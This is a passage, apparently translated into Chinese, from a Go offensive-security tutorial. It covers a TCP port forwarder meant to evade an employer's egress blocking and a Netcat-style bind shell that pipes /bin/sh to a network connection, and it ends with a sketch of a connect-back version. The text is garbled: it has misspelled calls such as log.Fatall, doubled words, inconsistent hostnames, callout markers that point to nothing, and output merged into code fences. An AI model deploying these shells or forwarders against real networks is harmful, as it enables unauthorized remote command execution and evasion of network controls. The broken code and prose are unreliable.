
现在你已经有了坚实的基础，可以利用到目前为止学到的内容创建一个简单的端口转发器，通过中间服务或主机来代理连接。正如本章早期提到的，这对于尝试规避限制性的出口控制或利用系统来绕过网络分段很有用。

## 场景说明

在列出代码之前，考虑这个想象但真实的场景：Joe 是 ACME 公司的一名表现平平的员工，在那里担任业务分析师，基于他在简历中包含的轻微夸大描述获得了丰颇的薪水。（他真的上过常春藤盟学校吗？Joe，这不符合道德。）Joe 缺乏动力，这只与他对猫咪的偏爱相程度——以至于 Joe 在家里安装了摄像头并托管了一个名为 `joescatcam.website` 的网站，通过该网站可以远程监控那些满是皮屑的毛球。但有一个问题：ACME 发现了 Joe。他们不喜欢他 24 小时都在用 4K 超高清直播他的猫，这消耗了大量宝贵的 ACME 网络带宽。ACME 甚至阻止了员工访问 Joe 的猫咪监控摄像头网站。

Joe 有了一个主意。“如果我在我控制的互联网系统上设置一个端口转发器呢，”Joe 说，“并强制将从该主机的所有流量重定向到 `joescatcam.website` 会怎么样？” Joe 在第二天检查了并确认他可以访问托管在 `joeproxy.com` 域名的个人网站。Joe 跳过了下午的会议，来到一家咖啡馆，并为他的问题编写了一个解决方案。他将把接收到 `http://joeproxy.com` 的所有流量转发到 `http://joescatcam.website`。

这里是 Joe 的代码，他在 `joeproxy.com` 服务器上运行：

```go
func handle(src net.Conn) {
    dst, err := net.Dial("tcp", "joescatcam.website:80")
    if err != nil {
        log.Fatall("Unable to connect to our unreachable host")
    }
    defer dst.Close()

    // Run in goroutine to prevent io.Copy from blocking
    go func() {
        // Copy our source's output to the destination
        if _, err := io.Copy(dst, src); err != nil {
            log.Fatall(err)
        }
    }()

    // Copy our destination's output back to our source
    if _, err := io.Copy(src, dst); err != nil {
        log.Fatall(err)
    }
}

func main() {
    // Listen on local port 80
    listener, err := net.Listen("tcp", ":80")
    if err != nil {
        log.Fatall("Unable to bind to port")
    }

    for {
        conn, err := listener.Accept()
        if err != nil {
            log.Fatall("Unable to accept connection")
        }
        go handle(conn)
    }
}
```

首先检查 Joe 的 `handle(net.Conn)` 函数。Joe 连接到 `joescatcam.website` ①（记住，这个不可达的主机无法从 Joe 的公司工作站直接访问）。Joe 分别调用了两次 `Copy(Writer, Reader)`。第一次调用 ③ 确保来自入站连接的数据被复制到 `joescatcam.website` 的连接。第二次调用 ❹ 确保从 `joescatcam.website` 读取的数据被写回到连接客户端的连接。因为 `Copy(Writer, Reader)` 是一个阻塞函数，在网络连接关闭之前将持续阻塞执行，Joe 明智地将第一次调用 `Copy(Writer, Reader)` 封装在一个新的 goroutine ② 中。这确保了 `handle(net.Conn)` 函数内的执行继续，并且可以进行第二次 `Copy(Writer, Reader)` 调用。

Joe 的代理监听端口 80，并中继从连接到和从 80 端口 `joescatcam.website` 接收到的所有流量。Joe 那个疯狂又浪费的男人，通过使用 `curl` 连接确认他可以通过 `joesproxy.com` 连接到 `joescatcam.website`：

```bash
$ curl -i -X GET http://joesproxy.com
```

```HTTP/1.1 200 OK
Date: Wed, 25 Nov 2020 19:51:54 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Thu, 27 Jun 2019 15:30:43 GMT
ETag: "6d-519594e72fd25"
Accept-Ranges: bytes
Content-Length: 109
```

## 复制 Netcat 用于执行命令

Netcat 是 TCP/IP 世界的瑞士军刀——本质上是 Telnet 的可脚本版本。它允许将任何程序的标准输入输出重定向到 TCP，从而允许攻击者执行命令。例如考虑以下：

```bash
$ nc -lp 1337 -e /bin/bash
```

此命令在 1337 端口创建了一个监听服务器。任何通过 Telnet 连接的远程客户端都能够执行任意 bash——这就是漏洞。Netcat 允许在编译程序时可选地包含此功能。（因此，标准 Linux 发行版中的 Netcat 不包含此功能。）它足够危险，因此我们将展示如何在 Go 中创建它！

首先，查看 Go 的 `os/exec` 包。你将用它运行操作系统命令。该包定义了一个类型 `Cmd`，它包含了运行命令以及操作输入输出所需的必要方法和属性。我们将标准输入（Reader）和输出（Writer）重定向到 `Conn` 实例（它既是 Reader 也是 Writer）。

当你接收到新连接时，可以使用 `os/exec` 中的 `Command(name string, arg ...string)` 函数创建一个新的 `Cmd` 实例。该函数接受操作系统命令和任何参数。例如，硬编码 `/bin/sh` 作为命令并将 `-i` 作为参数，表示你处于交互模式，这让你能够更可靠地操作输入输出：

```go
cmd := exec.Command("/bin/sh", "-i")
```

这创建了一个 `Cmd` 实例，但还没有执行命令。你有几种方法操作输入输出。你可以使用之前讨论过的 `Copy(Writer, Reader)`，或者直接将 `Reader` 赋值给 `Cmd.Stdin`。让我们直接将 `Conn` 对象赋值给 `cmd.Stdin` 和 `cmd.Stdout`，如下：

```go
cmd.Stdin = conn
cmd.Stdout = conn
```

在命令和流设置完成后，你通过使用 `cmd.Run()` 运行命令：

```go
if err := cmd.Run(); err != nil {
```

```go
// Handle error.
}
```

此逻辑在 Linux 系统上运行完美完美。

然而，当在 Windows 系统上调整并运行程序时（使用 `cmd.exe` 而不是 `/bin/bash`），你会发现连接客户端永远接收不到命令输出，这是因为 Windows 对匿名管道有一些特殊的处理方式。这里有两个该问题的解决方案。

首先，你可以调整代码，显式强制刷新 `stdout` 以应对这种细微差别。不要直接将 `Conn` 赋值给 `cmd.Stdout`，而是实现一个封装了 `bufio.Writer`（一个缓冲写入器）的自定义 `Writer`，并显式调用其 `Flush` 方法来强制刷新缓冲区。请参考第 35 页的“创建 Echo Server”以获取 `bufio.Writer` 的示例。

以下是自定义写入器 `Flusher` 的定义：

```go
// Flusher封装了 bufio.Writer，在所有写入时显式刷新。
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher 从 io.Writer 创建一个新的新的 Flusher。
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// Write 字节 bytes 并显式刷新缓冲区。
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}
```

`Flusher` 类型实现了 `Write([]byte)` 函数，该函数将数据写入底层的缓冲写入器，然后刷新输出。

通过实现自定义写入器，你可以调整连接处理器，实例化并使用这个 `Flusher` 自定义类型作为 `cmd.Stdout`：

```go
func handle(conn net.Conn) {
	// 显式使用 -i 调用 /bin/sh 以交互交互模式
	// 这样我们将其用于 stdin 和 stdout。
	// Windows 使用 exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// 将 stdin 设置为我们的连接
	cmd.Stdin = conn

	// 从连接中创建一个 Flusher 用于 stdout。
	// 这确保了 stdout 被充分刷新并通过 net.Conn 发送。
	cmd.Stdout = NewFlusher(conn)

	// 运行命令。
	if err := cmd.Run(); err != nil {
		log.Fatalf(err)
	}
}
```

这个解决方案虽然足够，但确实不优雅。虽然运行的代码比优雅的代码更重要，但我们将利用这个问题作为机会引入 `io.Pipe()` 函数，这是 Go 的同步、内存管道，可用于连接 Readers 和 Writers：

```go
func Pipe() (*PipeReader, *PipeWriter)
```

使用 `PipeReader` 和 `PipeWriter` 允许你避免显式地刷新写入器，并同步连接 `stdout` 和 TCP 连接。你将再次重写处理器函数：

```go
func handle(conn net.Conn) {
	// 显式调用 /bin/sh 并使用 -i 进入交互交互模式
	// 这样我们可以将其用于 stdin 和 stdout。
	// Windows 使用 exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	// 将 stdin 设置为我们的连接
	rp, wp := io.Pipe()
	cmd.Stdout = wp
	cmd.Stdin = conn
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}
```

对 `io.Pipe()` 的调用创建了同步连接的读取和写入器——任何写入写入器（示例中的 `wp`）的数据都会被读取器（`rp`）读取。因此，你将写入器分配给 `cmd.Stdout`，然后使用 `io.Copy(conn, rp)` 将 `PipeReader` 连接到 TCP 连接。你通过使用 goroutine 来防止代码阻塞。命令的任何标准输出都会发送到写入器，随后管道到读取器并通过 TCP 连接传出。这优雅吗？

到此，你已经从等待连接的 TCP 监听器的角度成功实现了 Netcat 巨大的安全漏洞。你可以使用类似的逻辑，从连接客户端的角度实现该功能，即将将本地二进制文件的 `stdout` 和 `stdin` 重定向到远程监听器。具体的细节由你来决定，但可能包括以下内容：

- 通过 `net.Dial(network, address string)` 建立到远程监听器的连接。
- 通过 `exec.Command(name)` 初始化一个 `Cmd`。
